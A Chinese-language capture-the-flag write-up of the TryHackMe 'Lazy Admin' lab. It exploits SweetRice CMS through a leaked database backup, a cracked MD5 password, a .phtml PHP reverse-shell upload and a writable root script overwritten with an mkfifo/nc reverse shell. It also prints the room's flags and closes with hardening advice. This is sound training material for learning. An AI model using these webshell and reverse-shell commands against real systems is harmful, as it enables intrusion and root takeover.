# THM Lazy Admin (10.49.186.78) 渗透测试 Writeup

**日期**: 2026-06-02  
**目标**: 10.49.186.78  
**平台**: TryHackMe 授权靶场  
**难度**: Easy  
**总耗时**: ~45 分钟

---

## 1. 信息搜集 (Reconnaissance)

### 1.1 端口扫描

使用 nmap 进行快速端口扫描：

```bash
nmap -Pn -sV --version-light --top-ports 1000 10.49.186.78
```

**结果**:

| 端口   | 状态 | 服务 | 版本                            |
| ------ | ---- | ---- | ------------------------------- |
| 22/tcp | open | ssh  | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80/tcp | open | http | Apache httpd 2.4.18 (Ubuntu)    |

仅开放 2 个端口，典型的 Web 靶机配置。

### 1.2 Web 服务探测

访问首页发现 SweetRice CMS 提示页面：

```bash
curl -s http://10.49.186.78/content/
```

返回内容显示：
- **CMS**: SweetRice - Simple Website Management System
- **版本**: 1.5.0 (2015-12-06)
- **状态**: 网站建设中，未开放访问

---

## 2. Web 枚举

### 2.1 目录枚举

使用 gobuster 进行目录枚举：

```bash
gobuster dir -u http://10.49.186.78/content/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,zip -t 20
```

**发现的关键目录**:

| 目录                     | 状态 | 说明            |
| ------------------------ | ---- | --------------- |
| `/content/_themes/`      | 301  | 主题目录        |
| `/content/as/`           | 301  | 管理后台        |
| `/content/attachment/`   | 301  | 附件目录        |
| `/content/images/`       | 301  | 图片目录        |
| `/content/inc/`          | 301  | 包含文件目录    |
| `/content/js/`           | 301  | JavaScript 目录 |
| `/content/changelog.txt` | 200  | 版本日志        |

### 2.2 版本确认

读取 changelog.txt 确认版本：

```bash
curl -s http://10.49.186.78/content/changelog.txt | head -20
```

确认版本为 **SweetRice 1.5.0**，发布于 2015 年，非常旧的版本。

### 2.3 已知漏洞搜索

使用 searchsploit 搜索 SweetRice 漏洞：

```bash
searchsploit SweetRice
```

**发现的漏洞** (针对 1.5.1 版本):

| 漏洞类型                   | Exploit ID | 说明         |
| -------------------------- | ---------- | ------------ |
| Arbitrary File Download    | 40698.py   | 任意文件下载 |
| Arbitrary File Upload      | 40716.py   | 任意文件上传 |
| Backup Disclosure          | 40718.txt  | 备份文件泄露 |
| Cross-Site Request Forgery | 40692.html | CSRF         |

---

## 3. 漏洞利用 - 数据库备份泄露

### 3.1 发现备份文件

尝试访问 SweetRice 的备份目录：

```bash
curl http://10.49.186.78/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
```

**成功下载完整的数据库备份文件！**

### 3.2 提取管理员凭据

在备份文件中搜索管理员信息，发现 `%--%_options` 表中的配置数据：

```sql
INSERT INTO `%--%_options` VALUES('1','global_setting','a:17:{s:4:"name";s:25:"Lazy Admin\'s Website";s:6:"author";s:10:"Lazy Admin";s:5:"title";s:0:"";s:8:"keywords";s:8:"Keywords";s:11:"description";s:11:"Description";s:5:"admin";s:7:"manager";s:6:"passwd";s:32:"42f749ade7f9e195bf475f37a44cafcb";s:5:"close";i:1;...}','1575023409');
```

**提取的凭据**:
- **用户名**: `manager`
- **密码哈希**: `42f749ade7f9e195bf475f37a44cafcb` (MD5)

### 3.3 密码破解

使用 john 破解 MD5 哈希：

```bash
echo "42f749ade7f9e195bf475f37a44cafcb" > /tmp/hash.txt
john --format=raw-md5 /tmp/hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**破解结果**: `Password123`

---

## 4. 登录管理后台

### 4.1 访问管理后台

使用获取的凭据登录 SweetRice 管理后台：

```bash
curl -X POST "http://10.49.186.78/content/as/index.php" \
  -d "user=manager" \
  -d "passwd=Password123" \
  -d "rememberme=0"
```

**登录成功！** 获得管理员权限，可以访问 Dashboard。

### 4.2 发现文件上传功能

在管理后台中，文章编辑页面 (`/content/as/?type=post&mode=insert`) 支持附件上传功能，包含：
- 图片上传
- 媒体文件上传
- 附件上传

---

## 5. 获取 Shell

### 5.1 上传 Webshell

在文章编辑页面，上传 `.phtml` 文件（绕过 PHP 文件限制）：

**Webshell 内容**:
```php
<?php
  $ip = '192.168.241.203';
  $port = 1234;
  $sock = fsockopen($ip, $port);
  $proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

上传成功后，文件位于：`http://10.49.186.78/content/attachment/webshell.phtml`

### 5.2 触发 Webshell

在 Kali 上监听端口：

```bash
nc -lvnp 1234
```

访问 webshell 触发反向 shell：

```bash
curl -s "http://10.49.186.78/content/attachment/webshell.phtml"
```

**成功获取 www-data 权限的 shell！**

### 5.3 稳定 Shell

使用 python 升级 tty：

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

然后按 `Ctrl+Z` 挂起，在 Kali 执行：

```bash
stty raw -echo; fg
```

在 shell 中设置：

```bash
export TERM=xterm
export SHELL=bash
```

---

## 6. 获取 User Flag

在稳定的 shell 中查找 user flag：

```bash
cat /home/itguy/user.txt
```

**User Flag**: `THM{63e5bce9271952aad1113b6f1ac28a07}`

---

## 7. 权限提升

### 7.1 检查 Sudo 权限

检查当前用户的 sudo 权限：

```bash
sudo -l
```

**重大发现**:

```
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: *** /home/itguy/backup.pl
```

`www-data` 可以 **无密码** sudo 执行 `/usr/bin/perl /home/itguy/backup.pl`！

### 7.2 分析 backup.pl

查看 backup.pl 内容：

```bash
cat /home/itguy/backup.pl
```

内容：
```perl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

脚本执行 `/etc/copy.sh`。

### 7.3 检查 copy.sh 权限

```bash
ls -la /etc/copy.sh
```

输出：
```
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

**关键发现**: `/etc/copy.sh` 对 `www-data` 可写（`-rw-r--rwx` 中的最后一个 `w`）！

### 7.4 修改 copy.sh

将 copy.sh 修改为反向 shell 命令：

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.241.203 5555 >/tmp/f' > /etc/copy.sh
```

验证修改：

```bash
cat /etc/copy.sh
```

### 7.5 执行提权

在 Kali 上监听 5555 端口：

```bash
nc -lvnp 5555
```

在靶机上执行 sudo：

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

**成功获取 root shell！**

### 7.6 获取 Root Flag

在 root shell 中执行：

```bash
whoami
id
cat /root/root.txt
```

**Root Flag**: `THM{6637f41d0177b6f37cb20d775124699f}`

---

## 8. 攻击路径总结

```
信息搜集 (nmap)
  → Web 枚举 (gobuster)
    → 发现 SweetRice CMS 1.5.0
      → 数据库备份泄露
        → 提取管理员凭据 (manager / MD5 hash)
          → 密码破解 (john → Password123)
            → 登录管理后台
              → 上传 .phtml webshell
                → 获取 www-data shell
                  → 查找 user flag
                    → 检查 sudo 权限
                      → 发现可执行 backup.pl (root)
                        → 发现 copy.sh 可写
                          → 修改 copy.sh 为反向 shell
                            → sudo 执行 backup.pl
                              → root 执行 copy.sh
                                → 获取 root shell
                                  → 读取 root flag
```

---

## 9. 关键技术点

### 9.1 数据库备份泄露
SweetRice CMS 的备份文件存储在 `/content/inc/mysql_backup/` 目录下，未设置访问控制，导致任意用户可直接下载完整的数据库备份。

### 9.2 MD5 密码破解
管理员密码使用 MD5 哈希存储，属于弱哈希算法。使用 john 配合 rockyou.txt 字典可在秒级内破解弱口令。

### 9.3 文件上传绕过
SweetRice 的文件上传功能对 `.php` 文件有限制，但使用 `.phtml` 扩展名可以绕过限制，因为 Apache 默认也会将 `.phtml` 文件作为 PHP 解析。

### 9.4 Sudo 权限配置错误
系统管理员配置了 `www-data` 可无密码 sudo 执行 `/usr/bin/perl /home/itguy/backup.pl`，而 backup.pl 是 root 拥有的脚本，这违反了最小权限原则。

### 9.5 可写文件利用
`/etc/copy.sh` 被 root 执行，但对 `www-data` 可写，这是典型的权限配置错误。通过修改该文件，可以让 root 执行任意命令。

---

## 10. 发现的凭据

| 服务          | 用户名  | 密码        | 来源                          |
| ------------- | ------- | ----------- | ----------------------------- |
| SweetRice CMS | manager | Password123 | 数据库备份 + john 破解        |
| MySQL         | rice    | randompass  | `/home/itguy/mysql_login.txt` |

---

## 11. 获取的 Flags

| Flag          | 路径                   | 内容                                    |
| ------------- | ---------------------- | --------------------------------------- |
| **User Flag** | `/home/itguy/user.txt` | `THM{63e5bce9271952aad1113b6f1ac28a07}` |
| **Root Flag** | `/root/root.txt`       | `THM{6637f41d0177b6f37cb20d775124699f}` |

---

## 12. 安全建议

1. **删除或保护备份文件**: 数据库备份文件不应存储在 Web 可访问目录下
2. **使用强密码**: 避免使用 `Password123` 等弱口令
3. **使用强哈希算法**: 使用 bcrypt、Argon2 等现代密码哈希算法替代 MD5
4. **限制文件上传类型**: 严格限制上传文件的扩展名，不仅在前端验证
5. **最小权限原则**: 避免给 Web 服务器用户 sudo 权限
6. **保护敏感文件**: 确保只有 root 能读写 `/etc/copy.sh` 等敏感文件
7. **定期更新软件**: SweetRice 1.5.0 发布于 2015 年，存在多个已知漏洞，应及时更新

---

## 13. 参考信息

- **靶机名称**: Lazy Admin (TryHackMe)
- **操作系统**: Ubuntu 16.04 (Linux 4.15.0-70-generic)
- **Web 服务器**: Apache 2.4.18
- **CMS**: SweetRice 1.5.0/1.5.1
- **PHP 版本**: 7.x (推测)
- **数据库**: MySQL (推测)

---

*Writeup 生成时间: 2026-06-02 18:03 CST*  
*测试环境: Kali Linux + OpenClaw*  
*授权范围: TryHackMe 授权靶场，仅限 10.49.186.78*